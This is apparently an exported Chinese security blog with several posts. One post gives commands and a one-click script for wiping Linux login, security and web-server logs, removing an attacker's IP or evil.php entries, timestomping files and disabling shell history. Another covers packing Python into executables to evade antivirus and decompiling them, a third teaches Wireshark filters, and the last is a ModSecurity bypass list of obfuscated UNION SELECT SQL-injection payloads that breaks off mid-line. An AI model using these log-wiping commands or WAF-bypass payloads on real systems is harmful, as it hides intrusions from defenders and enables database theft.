    <title>ç—•è¿¹æ¸…ç†-Linuxç¯‡</title>
    <url>/posts/1b08230/</url>
    <content><![CDATA[<h3 id="ç™»å½•ç—•è¿¹æ¸…ç†"><a href="#ç™»å½•ç—•è¿¹æ¸…ç†" class="headerlink" title="ç™»å½•ç—•è¿¹æ¸…ç†"></a>ç™»å½•ç—•è¿¹æ¸…ç†</h3><h4 id="åŸºæœ¬çš„æ—¥å¿—ç»“æ„"><a href="#åŸºæœ¬çš„æ—¥å¿—ç»“æ„" class="headerlink" title="åŸºæœ¬çš„æ—¥å¿—ç»“æ„"></a>åŸºæœ¬çš„æ—¥å¿—ç»“æ„</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/btmp è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/wtmp è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼Œä½¿ç”¨lastå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/utmp è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½¿ç”¨w,who,usersç­‰å‘½ä»¤æŸ¥çœ‹</span><br><span class="line">/var/log/secure è®°å½•ä¸å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/var/log/message è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—</span><br></pre></td></tr></table></figure>

<h4 id="æ¸…é™¤æ—¥å¿—"><a href="#æ¸…é™¤æ—¥å¿—" class="headerlink" title="æ¸…é™¤æ—¥å¿—"></a>æ¸…é™¤æ—¥å¿—</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line"># æ¸…é™¤ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´</span><br><span class="line">echo &gt; /var/log/lastlog </span><br><span class="line"># æ¸…é™¤å®‰å…¨æ—¥å¿—è®°å½•</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># æ¸…é™¤ç³»ç»Ÿæ—¥å¿—è®°å½•</span><br><span class="line">cat /dev/null &gt; /var/log/secure</span><br><span class="line"># æ¸…é™¤å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯</span><br><span class="line">echo &gt; /var/log/utmp </span><br></pre></td></tr></table></figure>

<h4 id="åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ-æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip"><a href="#åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ-æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip" class="headerlink" title="åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip"></a>åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip</h4><p><code>sed -i &#39;/è‡ªå·±çš„ip/&#39;d /var/log/messages</code></p>
<h4 id="å…¨å±€æ›¿æ¢è‡ªå·±ip"><a href="#å…¨å±€æ›¿æ¢è‡ªå·±ip" class="headerlink" title="å…¨å±€æ›¿æ¢è‡ªå·±ip"></a>å…¨å±€æ›¿æ¢è‡ªå·±ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
<p>å‰é¢æ˜¯å¾…æ›¿æ¢ip åé¢ä¸ºæ›¿æ¢åçš„ip</p>
<h3 id="æ—¶é—´ç—•è¿¹æ¸…ç†"><a href="#æ—¶é—´ç—•è¿¹æ¸…ç†" class="headerlink" title="æ—¶é—´ç—•è¿¹æ¸…ç†"></a>æ—¶é—´ç—•è¿¹æ¸…ç†</h3><p><code>ls -al</code> å¯ä»¥æŸ¥çœ‹åˆ›å»ºæ—¶é—´</p>
<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch -r ç›®æ ‡æ—¶é—´çš„æ–‡ä»¶ éœ€è¦ä¿®æ”¹æ—¶é—´çš„æ–‡ä»¶</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ï¼š ä»…ä¿®æ”¹access time</span><br><span class="line">-c ï¼šä»…ä¿®æ”¹æ—¶é—´ï¼Œè€Œä¸å»ºç«‹æ–‡ä»¶</span><br><span class="line">-d ï¼šåé¢å¯ä»¥æ¥æ—¥æœŸï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ --date=&quot;æ—¥æœŸæˆ–æ—¶é—´&quot;</span><br><span class="line">-m ï¼šä»…ä¿®æ”¹mtime</span><br><span class="line">-t ï¼šåé¢å¯ä»¥æ¥æ—¶é—´ï¼Œæ ¼å¼ä¸º [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>

<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> å°†å½“å‰ç³»ç»Ÿæ—¥æœŸä¿®æ”¹ä¸º2014å¹´07æœˆ12 18:30:50</p>
<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # â€“hctosys å°†ç³»ç»Ÿæ—¶é’Ÿè°ƒæ•´ä¸ºä¸ç›®å‰çš„ç¡¬ä»¶æ—¶é’Ÿä¸€è‡´ã€‚</p>
<h3 id="æ“ä½œç—•è¿¹æ¸…ç†"><a href="#æ“ä½œç—•è¿¹æ¸…ç†" class="headerlink" title="æ“ä½œç—•è¿¹æ¸…ç†"></a>æ“ä½œç—•è¿¹æ¸…ç†</h3><h4 id="æœåŠ¡æ—¥å¿—ä¿®æ”¹"><a href="#æœåŠ¡æ—¥å¿—ä¿®æ”¹" class="headerlink" title="æœåŠ¡æ—¥å¿—ä¿®æ”¹"></a>æœåŠ¡æ—¥å¿—ä¿®æ”¹</h4><p># ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤,</p>
<p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
<p># æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶</p>
<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
<h4 id="historyè®°å½•æ¸…ç†"><a href="#historyè®°å½•æ¸…ç†" class="headerlink" title="historyè®°å½•æ¸…ç†"></a>historyè®°å½•æ¸…ç†</h4><ul>
<li>ç™»å½•sshåä¸è®°å½•history</li>
</ul>
<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
<ul>
<li>æ¸…ç† <code>~/.bash_history</code></li>
<li><code>history -c </code></li>
<li><code>vim /etc/profile</code> ä¿®æ”¹ <code>HISTSIZE=0</code></li>
</ul>
<h4 id="æ–‡ä»¶è¦†å†™"><a href="#æ–‡ä»¶è¦†å†™" class="headerlink" title="æ–‡ä»¶è¦†å†™"></a>æ–‡ä»¶è¦†å†™</h4><ul>
<li>å•æ–‡ä»¶</li>
</ul>
<p><code>shred -f -u -z -v -n 8 1.txt</code></p>
<ul>
<li>æ–‡ä»¶å¤¹</li>
</ul>
<p><code>wipe -r</code></p>
<h3 id="éšè—sshç™»å½•è®°å½•"><a href="#éšè—sshç™»å½•è®°å½•" class="headerlink" title="éšè—sshç™»å½•è®°å½•"></a>éšè—sshç™»å½•è®°å½•</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
<p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash â€“i</code></p>
<p><code>-o UserKnownHostsFile=/dev/null</code> #è¿™ä¸ªæ˜¯knowhostçš„ä¿¡æ¯åŠå…¬é’¥</p>
<p><code>-T user@host /bin/bash â€“i</code> #ä¸åˆ†é…ä¼ªç»ˆç«¯ä½†æ˜¯ç»™ä¸ªbashçš„ç»ˆç«¯</p>
<h3 id="ä¸€é”®æ¸…é™¤è„šæœ¬"><a href="#ä¸€é”®æ¸…é™¤è„šæœ¬" class="headerlink" title="ä¸€é”®æ¸…é™¤è„šæœ¬"></a>ä¸€é”®æ¸…é™¤è„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç—•è¿¹æ¸…ç†</category>
      </categories>
      <tags>
        <tag>ç—•è¿¹æ¸…ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>python_pycåç¼–è¯‘</title>
    <url>/posts/76fcd9b1/</url>
    <content><![CDATA[<p><a href="https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA">https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA</a></p>
<p>python  pyinstaller æ‰“åŒ…exeå…æ€</p>
<h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p><code>https://www.virustotal.com/gui/file/8bc40da35383f54998be34e32c0ff22e25dd9c4c8f5df1c10e6f0bb9e431c8b0?nocache=1</code>    3/69</p>
<h3 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h3><p>ä½¿ç”¨py2exe æ‰“åŒ…å®Œæ–‡ä»¶å ä¼šç”Ÿæˆå¤šä¸ªæ–‡ä»¶ äºŒ pyinstaller ä¼šç”Ÿäº§ä¸€ä¸ªexe</p>
<p><code>https://www.virustotal.com/gui/file/823d00a6d1ab82bbfaa5e997d5192b72cca7dba0e9b2d18d69ecf15e75fff9e7?nocache=1</code>  5/69</p>
<h3 id="åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶"><a href="#åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶" class="headerlink" title="åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶"></a>åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶</h3><p><a href="https://github.com/countercept/Python-exe-unpacker">https://github.com/countercept/Python-exe-unpacker</a></p>
<p>pyinstalleråœ¨æ‰“åŒ…pycæ—¶ï¼Œä¼šå»æ‰pycçš„<code>magic</code>å’Œ<code>æ—¶é—´æˆ³</code>ã€‚éœ€è¦è¿›è¡Œæ‰‹å·¥ä¿®å¤ã€‚pyinstalleråœ¨æ‰“åŒ…çš„ç³»ç»Ÿåº“çš„æ—¶å€™æ˜¯ä¸ä¼šå»æ‰magicçš„ï¼Œæ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿåº“çš„magicå³å¯</p>
<p>åœ¨å°†exe è½¬æ¢ä¸ºpycæ–‡ä»¶æœ‰ä¸¤ç§æ–¹æ³• å¦‚ä¸‹</p>
<h4 id="å°†-exe-æ–‡ä»¶è½¬æ¢ä¸º-pyc-æ–‡ä»¶"><a href="#å°†-exe-æ–‡ä»¶è½¬æ¢ä¸º-pyc-æ–‡ä»¶" class="headerlink" title="å°† exe æ–‡ä»¶è½¬æ¢ä¸º pyc æ–‡ä»¶"></a>å°† exe æ–‡ä»¶è½¬æ¢ä¸º pyc æ–‡ä»¶</h4><h5 id="ä½¿ç”¨-pyinstxtractor-py"><a href="#ä½¿ç”¨-pyinstxtractor-py" class="headerlink" title="ä½¿ç”¨ pyinstxtractor.py"></a>ä½¿ç”¨ pyinstxtractor.py</h5><p><a href="https://sourceforge.net/projects/pyinstallerextractor/">https://sourceforge.net/projects/pyinstallerextractor/</a></p>
<p>å°†exe å’Œ pyinstxtractor.py æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹</p>
<p><code>python pyinstxtractor.py test.exe</code></p>
<p>ç„¶åä¼šç”Ÿæˆ</p>
<p><img src="/posts/76fcd9b1/1.PNG" alt="æˆªå›¾"></p>
<br>

<h5 id="ä½¿ç”¨pyi-archive-viewer"><a href="#ä½¿ç”¨pyi-archive-viewer" class="headerlink" title="ä½¿ç”¨pyi-archive_viewer"></a>ä½¿ç”¨pyi-archive_viewer</h5><p>äºŒæ˜¯ä½¿ç”¨pyi-archive_viewerå‘½ä»¤ï¼ˆéœ€è¦å®‰è£…pyinstallerï¼‰</p>
<p><code>pyi-archive_viewer test.exe</code></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer1.PNG" alt="æˆªå›¾"></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer2.PNG" alt="æˆªå›¾"></p>
<p>è¿™æ ·ä¼šç”Ÿæˆä¸€ä¸ªtest2.pycæ–‡ä»¶ ç„¶åæ¢å¤è¢«pyinstaller æ‰“åŒ…ååˆ é™¤çš„å­—èŠ‚</p>
<h4 id="ä¿®å¤pyc-æ–‡ä»¶"><a href="#ä¿®å¤pyc-æ–‡ä»¶" class="headerlink" title="ä¿®å¤pyc æ–‡ä»¶"></a>ä¿®å¤pyc æ–‡ä»¶</h4><p>åœ¨<code>test.exe_extracted</code>æ–‡ä»¶ä¸‹ å­˜åœ¨struct å’Œ test ä¸¤æ–‡ä»¶<br><img src="/posts/76fcd9b1/3.PNG" alt="æˆªå›¾"></p>
<p>ä½¿ç”¨010editoræ‰“å¼€ å°†structçš„ç¬¬ä¸€è¡Œæ’å…¥åˆ°testçš„ç¬¬ä¸€è¡Œ<br><img src="/posts/76fcd9b1/4.PNG" alt="æˆªå›¾"><br><img src="/posts/76fcd9b1/5.PNG" alt="æˆªå›¾"></p>
<p>æ·»åŠ å<br><img src="/posts/76fcd9b1/6.PNG" alt="æˆªå›¾"><br> å¦å­˜ä¸ºtest.pycå³å¯</p>
<h4 id="å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç "><a href="#å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç " class="headerlink" title="å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç "></a>å°†pycæ–‡ä»¶è½¬æ¢ä¸ºpythonä»£ç </h4><h5 id="åœ¨çº¿pycåç¼–è¯‘"><a href="#åœ¨çº¿pycåç¼–è¯‘" class="headerlink" title="åœ¨çº¿pycåç¼–è¯‘"></a>åœ¨çº¿pycåç¼–è¯‘</h5><p> <a href="https://tool.lu/pyc">https://tool.lu/pyc</a></p>
<p><img src="/posts/76fcd9b1/7.PNG" alt="æˆªå›¾"></p>
<h5 id="ä½¿ç”¨-uncompyle6"><a href="#ä½¿ç”¨-uncompyle6" class="headerlink" title="ä½¿ç”¨ uncompyle6"></a>ä½¿ç”¨ <code>uncompyle6</code></h5><p> (éœ€è¦ä½¿ç”¨pip å®‰è£… <code>pip install uncompyle6</code>  ä½†æ˜¯ä¸æ”¯æŒpython3.9ç‰ˆæœ¬) </p>
<p><code>uncompyle6 test.pyc</code> å³å¯æŸ¥çœ‹pythonä»£ç <br><img src="/posts/76fcd9b1/8.PNG" alt="æˆªå›¾"><br>ä¹Ÿå¯ä»¥å°†å†…å®¹ä¿å­˜åˆ°test.py <code>uncompyle6 test.pyc &gt; test.py</code></p>
<p>è¸©å‘ï¼š<br>ï¼ˆåœ¨ä½¿ç”¨æ—¶ ç”±äºæœ¬æœºå†…pythonç¯å¢ƒæ¯”è¾ƒå¤æ‚  æœ‰ä¸‰ä¸ªç¯å¢ƒ ç»“æœæå¾—ç‰ˆæœ¬ä¸ç»Ÿä¸€ ç„¶åä¸€ç›´æŠ¥é”™pycçš„magic å¤±è´¥ çœ‹äº†ä¸‹<a href="https://fishc.com.cn/forum.php?mod=viewthread&tid=131172&highlight=pyc+%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">https://fishc.com.cn/forum.php?mod=viewthread&amp;tid=131172&amp;highlight=pyc%2B%B7%B4%BB%E3%B1%E0</a> æ„è¯†åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼‰ åœ¨è™šæ‹Ÿæœºä¸Šå°±å¯ä»¥æˆåŠŸé¿å…è¿™ç§é—®é¢˜</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/10450#toc-11">https://xz.aliyun.com/t/10450#toc-11</a></p>
<p><a href="https://fishc.com.cn/thread-131172-1-1.html">https://fishc.com.cn/thread-131172-1-1.html</a></p>
<p><a href="https://jishuin.proginn.com/p/763bfbd69fa1">https://jishuin.proginn.com/p/763bfbd69fa1</a></p>
<p><a href="https://www.cxymm.net/article/qq_36078992/103596170">https://www.cxymm.net/article/qq_36078992/103596170</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>wiresharkå­¦ä¹ -1</title>
    <url>/posts/6c4c4fdf/</url>
    <content><![CDATA[<h3 id="wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼"><a href="#wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼" class="headerlink" title="wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼"></a>wiresharké»˜è®¤æ˜¾ç¤ºæ–¹å¼</h3><p><img src="/posts/6c4c4fdf/1.png" alt="æˆªå›¾"></p>
<h3 id="wiresharkä¸­-é»˜è®¤çš„åˆ—"><a href="#wiresharkä¸­-é»˜è®¤çš„åˆ—" class="headerlink" title="wiresharkä¸­ é»˜è®¤çš„åˆ—"></a>wiresharkä¸­ é»˜è®¤çš„åˆ—</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No. ï¼šæ•è·çš„æ•°æ®å¸§åºå·ï¼Œç¬¬ä¸€å¸§å§‹ç»ˆä¸º 1ã€‚</span><br><span class="line">Time ï¼šä»æ•è·çš„ç¬¬ä¸€å¸§å¼€å§‹çš„è®¡ç®—çš„æ—¶é—´ï¼ˆå•ä½ä¸ºçº³ç§’ï¼‰ï¼Œç¬¬ä¸€å¸§æ ‡è®°ä¸º 0.000000ã€‚</span><br><span class="line">Source ï¼šæºåœ°å€ï¼Œé€šå¸¸æ˜¯ IPv4ã€IPv6 æˆ–è€… ä»¥å¤ªç½‘åœ°å€ã€‚</span><br><span class="line">Destination ï¼šç›®çš„åœ°å€ï¼Œé€šå¸¸æ˜¯ IPv4ã€IPv6 æˆ–è€… ä»¥å¤ªç½‘åœ°å€ã€‚</span><br><span class="line">Protocol ï¼šä»¥å¤ªç½‘å¸§ã€IPæ•°æ®åŒ…ã€TCPåˆ†ç‰‡æ‰€ä½¿ç”¨çš„åè®®ï¼ˆARPã€DNSã€TCPã€HTTPç­‰ï¼‰ã€‚</span><br><span class="line">Length ï¼šæ•°æ®å¸§é•¿åº¦ï¼ˆå•ä½ä¸ºå­—èŠ‚ï¼‰ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="éšè—ä¸éœ€è¦çš„åˆ—"><a href="#éšè—ä¸éœ€è¦çš„åˆ—" class="headerlink" title="éšè—ä¸éœ€è¦çš„åˆ—"></a>éšè—ä¸éœ€è¦çš„åˆ—</h4><p>å¯ä»¥é€šè¿‡å³é”®æ ‡é¢˜æ  é€‰æ‹©éšè—ä¸éœ€è¦çš„åˆ—</p>
<h4 id="åˆ é™¤ä¸éœ€è¦çš„åˆ—"><a href="#åˆ é™¤ä¸éœ€è¦çš„åˆ—" class="headerlink" title="åˆ é™¤ä¸éœ€è¦çš„åˆ—"></a>åˆ é™¤ä¸éœ€è¦çš„åˆ—</h4><p>å¦‚æœæœ‰äº›åˆ—ç”¨ä¸åˆ° å¯ä»¥é€‰æ‹©è¯¥åˆ—åå³é”® -&gt; Remove This Column è¿›è¡Œåˆ é™¤</p>
<h4 id="æ·»åŠ éœ€è¦çš„åˆ—"><a href="#æ·»åŠ éœ€è¦çš„åˆ—" class="headerlink" title="æ·»åŠ éœ€è¦çš„åˆ—"></a>æ·»åŠ éœ€è¦çš„åˆ—</h4><p>å³é”®ç‚¹å‡»æ ‡é¢˜æ  é€‰æ‹©<code>Column Preferences</code> ç‚¹å‡»å·¦ä¸‹è§’çš„ <code>+</code>  åˆ—è¡¨ä¸­å°†ä¼šå‡ºç°ä¸€ä¸ªæ ‡é¢˜ä¸ºNew Columnçš„è¡¨é¡¹ã€‚</p>
<h4 id="ä¿®æ”¹æ—¶é—´æ ¼å¼"><a href="#ä¿®æ”¹æ—¶é—´æ ¼å¼" class="headerlink" title="ä¿®æ”¹æ—¶é—´æ ¼å¼"></a>ä¿®æ”¹æ—¶é—´æ ¼å¼</h4><p>ç‚¹å‡»èœå•æ çš„ <code>è§†å›¾</code> é€‰æ‹© <code>æ—¶é—´æ˜¾ç¤ºæ ¼å¼</code> å¯ä»¥å»é€‰æ‹©<code>UTC</code> ç§’ç­‰</p>
<h4 id="æ·»åŠ è‡ªå®šä¹‰åˆ—"><a href="#æ·»åŠ è‡ªå®šä¹‰åˆ—" class="headerlink" title="æ·»åŠ è‡ªå®šä¹‰åˆ—"></a>æ·»åŠ è‡ªå®šä¹‰åˆ—</h4><p>å¯ä»¥é€‰æ‹©æ•°æ®åŒ…ç»†èŠ‚çª—å£ é€‰æ‹©éœ€è¦æ·»åŠ çš„æ•°æ® å³é”®ç‚¹å‡»åº”ç”¨ä¸ºåˆ— å³å¯æˆåŠŸæ·»åŠ </p>
<hr>
<p>èƒŒæ™¯ä¸ºçº¢è‰² =&gt; è¿™ä¸ªè¡¨è¾¾å¼å°šæœªè¢«æ¥å—</p>
<p>èƒŒæ™¯ä¸ºç»¿è‰² =&gt; è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥æ­£å¸¸å·¥ä½œ</p>
<p>èƒŒæ™¯ä¸ºé»„è‰² =&gt; è¿™ä¸ªè¡¨è¾¾å¼å¯ä»¥è¢«æ¥å—ï¼Œä½†æ˜¯å¯èƒ½ä¸ä¼šæŒ‰é¢„æœŸå·¥ä½œ</p>
<br>

<p>wireshark æ˜¾ç¤ºè¿‡æ»¤å™¨   å¸ƒå°”è¡¨è¾¾å¼</p>
<ul>
<li>ç­‰äº        ==  æˆ– eq</li>
<li>ä¸”            &amp;&amp; æˆ– and</li>
<li>æˆ–             ||       æˆ– or</li>
</ul>
<br>

<p>eg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr eq 192.168.10.195 and ip.addr == 192.168.10.1</span><br><span class="line"></span><br><span class="line">http.request &amp;&amp; ip.addr == 192.168.10.195</span><br><span class="line"></span><br><span class="line">http.request || http.response</span><br><span class="line"></span><br><span class="line">dns.qry.name contains microsoft or dns.qry.name contains windows</span><br></pre></td></tr></table></figure>

<br>

<p>é€‰æ‹©æ’é™¤ç‰¹å®šå€¼æ—¶ ä¸è¦åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨ != </p>
<p>å¯ä»¥ä½¿ç”¨<code>!(ip.addr == 192.168.10.1)</code>  è€Œä¸æ˜¯ä½¿ç”¨<code>ip.addr != 192.168.10.1</code></p>
<br>

<p><code>http.request or ssl.handshake.type == 1</code></p>
<p><code>http.request</code>  </p>
<p><code>ssl.handshake.type == 1</code></p>
<br>

<hr>
<h3 id="è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·"><a href="#è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·" class="headerlink" title="è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·"></a>è¯†åˆ«ä¸»æœºå’Œç”¨æˆ·</h3><h4 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h4><br>

<h4 id="nbns"><a href="#nbns" class="headerlink" title="nbns"></a>nbns</h4>]]></content>
  </entry>
  <entry>
    <title>Modsecuity_bypass</title>
    <url>/posts/1460cbad/</url>
    <content><![CDATA[<h3 id="Union-Select"><a href="#Union-Select" class="headerlink" title="Union Select"></a>Union Select</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!50000%55nIoN*/ /*!50000%53eLeCt*/</span><br><span class="line">%55nion(%53elect 1,2,3)-- -</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">/**//*!12345UNION SELECT*//**/</span><br><span class="line">/**//*!50000UNION SELECT*//**/</span><br><span class="line">/**/UNION/**//*!50000SELECT*//**/</span><br><span class="line">/*!50000UniON SeLeCt*/</span><br><span class="line">union /*!50000%53elect*/</span><br><span class="line">+ #?uNiOn + #?sEleCt</span><br><span class="line">+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">/*!%55NiOn*/ /*!%53eLEct*/</span><br><span class="line">/*!u%6eion*/ /*!se%6cect*/</span><br><span class="line">+un/**/ion+se/**/lect</span><br><span class="line">uni%0bon+se%0blect</span><br><span class="line">%2f**%2funion%2f**%2fselect</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">REVERSE(noinu)+REVERSE(tceles)</span><br><span class="line">/*--*/union/*--*/select/*--*/</span><br><span class="line">union (/*!/**/ SeleCT */ 1,2,3)</span><br><span class="line">/*!union*/+/*!select*/</span><br><span class="line">union+/*!select*/</span><br><span class="line">/**/union/**/select/**/</span><br><span class="line">/**/uNIon/**/sEleCt/**/</span><br><span class="line">+%2F**/+Union/*!select*/</span><br><span class="line">/**//*!union*//**//*!select*//**/</span><br><span class="line">/*!uNIOn*/ /*!SelECt*/</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">uNiOn aLl sElEcT</span><br><span class="line">UNIunionON+SELselectECT</span><br><span class="line">/**/union/*!50000select*//**/</span><br><span class="line">0%a0union%a0select%09</span><br><span class="line">%0Aunion%0Aselect%0A</span><br><span class="line">%55nion/**/%53elect</span><br><span class="line">uni&lt;on all=&quot;&quot; sel=&quot;&quot;&gt;/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/</span><br><span class="line">%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/</span><br><span class="line">%0A%09UNION%0CSELECT%10NULL%</span><br><span class="line">/*!union*//*--*//*!all*//*--*//*!select*/</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/</span><br><span class="line">+UnIoN/*&amp;a=*/SeLeCT/*&amp;a=*/</span><br><span class="line">union+sel%0bect</span><br><span class="line">+uni*on+sel*ect+</span><br><span class="line">+#1q%0Aunion all#qa%0A#%0Aselect</span><br><span class="line">union(select (1),(2),(3),(4),(5))</span><br><span class="line">UNION(SELECT(column)FROM(table))</span><br><span class="line">%23xyz%0AUnIOn%23xyz%0ASeLecT+</span><br><span class="line">%23xyz%0A%55nIOn%23xyz%0A%53eLecT+</span><br><span class="line">union(select(1),2,3)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">uNioN (/*!/**/ SeleCT */ 11)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">+#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</span><br><span class="line">%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/</span><br><span class="line">+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+</span><br><span class="line">+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/</span><br><span class="line">+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+</span><br><span class="line">/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/</span><br><span class="line">/union\sselect/g</span><br><span class="line">/union\s+select/i</span><br><span class="line">/*!UnIoN*/SeLeCT</span><br><span class="line">+UnIoN/*&amp;a=*/SeLeCT/*&amp;a=*/</span><br><span class="line">+uni&gt;on+sel&gt;ect+</span><br><span class="line">+(UnIoN)+(SelECT)+</span><br><span 